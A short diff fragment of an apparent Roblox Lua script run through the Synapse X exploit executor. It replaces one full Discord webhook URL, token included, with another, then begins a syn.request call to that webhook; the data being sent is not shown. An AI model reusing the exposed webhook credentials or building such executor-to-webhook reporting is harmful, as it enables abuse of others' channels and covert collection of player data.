@@ -45,7 +45,7 @@ local Blacklisted = {
 
 if game.Players.LocalPlayer then
 local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1089241992824885408/ik3e46MArT5JKGmEy1DQyRq7SCevxAN0khnqHFz90xdESRqyOzBLTEIyBgdnZNd0_3iI"
+local Webhook_URL = "https://discord.com/api/webhooks/1089253671222661210/ZXPFyDP-cYVayYiYauZOxIH09pZ-nD86F1gghqXgxefXN9_gstAuwd-R6IZb_aTIu9NE"
 
 local response = syn.request({
     Url = Webhook_URL,
